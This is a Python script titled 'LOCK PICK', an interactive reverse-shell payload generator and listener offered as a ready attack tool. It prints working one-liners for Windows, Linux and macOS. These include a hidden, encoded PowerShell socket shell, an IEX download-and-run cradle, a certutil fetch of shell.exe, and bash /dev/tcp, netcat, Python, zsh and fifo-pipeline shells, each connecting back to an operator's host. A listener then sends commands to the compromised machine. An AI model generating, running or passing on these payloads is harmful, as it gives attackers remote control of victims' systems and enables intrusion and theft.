#!/usr/bin/env python3
import socket
import sys
import base64

def print_banner():
    # Simple, high-contrast block banner that cannot break markdown formatting text boxes
    print("=" * 80)
    print(" " * 35 + "LOCK PICK")
    print(" " * 18 + "CROSS-PLATFORM PAYLOAD GENERATOR & LISTENER")
    print("=" * 80 + "\n")

def generate_payloads(lhost, lport):
    """Generates an array of native payloads categorized by system capability."""
    ps_raw = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
    ps_b64 = base64.b64encode(ps_raw.encode('utf-16-le')).decode()
    
    w1 = f"powershell -nop -w hidden -ep bypass -encodedcommand {ps_b64}"
    w2 = f"cmd.exe /c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/payload.ps1')"
    w3 = f"certutil.exe -urlcache -split -f http://{lhost}/shell.exe %TEMP%/shell.exe"
    
    win_options = {
        "1": ("PowerShell Standard Encoded One-Liner", w1),
        "2": ("CMD WebClient Download Exec", w2),
        "3": ("Certutil Living-off-the-Land", w3)
    }

    l1 = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    l2 = f"nc {lhost} {lport} -e /bin/bash"
    l3 = "python3 -c " + chr(34) + f"import socket,os,subprocess;s=socket.socket();s.connect(('{lhost}',{lport}));[os.dup2(s.fileno(),i) for i in (0,1,2)];subprocess.call(['/bin/sh','-i'])" + chr(34)

    linux_options = {
        "1": ("Bash TCP Standard Channel", l1),
        "2": ("Netcat Native Shell Flag", l2),
        "3": ("Python3 Native Socket Interactive", l3)
    }

    m1 = f"zsh -c zmodload zsh/net/tcp && ztcp {lhost} {lport} && zsh <&$REPLY >&$REPLY 2>&$REPLY"
    m2 = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    m3 = f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"

    mac_options = {
        "1": ("Zsh Native Channel Framework", m1),
        "2": ("Bash TCP Alternative Mapping", m2),
        "3": ("NC Fifo Pipeline Bypasser", m3)
    }

    return {"W": win_options, "L": linux_options, "M": mac_options}

def start_listener(lport):
    """Starts a robust raw TCP listener bound to 0.0.0.0 to prevent address binding conflicts."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(("0.0.0.0", int(lport)))
        server.listen(1)
        print(f"\n[*] Listener armed on all local interfaces (0.0.0.0) at Port {lport}...")
        conn, addr = server.accept()
        print(f"[+] Connection intercepted from {addr}\n")
        while True:
            conn.settimeout(1.0)
            try:
                response = conn.recv(4096).decode(errors='ignore')
                sys.stdout.write(response)
            except socket.timeout:
                pass
            command = input()
            if command.lower() in ['exit', 'quit']:
                conn.send(b'exit\n')
                break
            if command.strip():
                conn.send((command + '\n').encode())
    except KeyboardInterrupt:
        print("\n[-] Listener shutting down.")
    except Exception as e:
        print(f"\n[-] Net-Stack Error: {e}")
    finally:
        server.close()

def main():
    print_banner()
    lhost = input("[?] Enter your target-facing IP (LHOST): ").strip()
    lport = input("[?] Enter your local tracking Port (LPORT): ").strip()
    
    if not lhost or not lport:
        print("[-] Configuration metrics cannot be empty.")
        return

    master_payloads = generate_payloads(lhost, lport)

    while True:
        print("\n--- Target Architecture Selection ---")
        print("[W] Windows Frameworks")
        print("[L] Linux Distributions")
        print("[M] macOS Frameworks")
        print("[999] Exit Toolkit Entirely")
        
        os_choice = input("\n[?] Select Target OS Family (W/L/M/999): ").strip().upper()
        
        if os_choice == '999':
            print("[*] Exiting toolkit environment.")
            break
            
        if os_choice in master_payloads:
            while True:
                print(f"\n--- Available Variations ---")
                for sub_key, (variant_name, _) in master_payloads[os_choice].items():
                    print(f" [{sub_key}] {variant_name}")
                print(" [999] Go Back to Main Menu")
                    
                variant_choice = input("\n[?] Select payload index variation (or '999' to go back): ").strip()
                
                if variant_choice == '999':
                    break
                    
                if variant_choice in master_payloads[os_choice]:
                    label, payload = master_payloads[os_choice][variant_choice]
                    print("\n[+] Copy/Paste this payload configuration string into target workspace:\n")
                    print("-" * 80)
                    print(payload)
                    print("-" * 80)
                    
                    launch = input("\n[?] Fire up local socket listener infrastructure now? (y/n): ").strip().lower()
                    if launch == 'y':
                        start_listener(lport)
                    
                    back_to_menu = input("\n[?] Return to architecture selection menu? (y/n): ").strip().lower()
                    if back_to_menu == 'y':
                        break
                else:
                    print("[-] Invalid execution index target.")
        else:
            print("[-] OS structure architecture not recognized.")

if __name__ == "__main__":
    main()
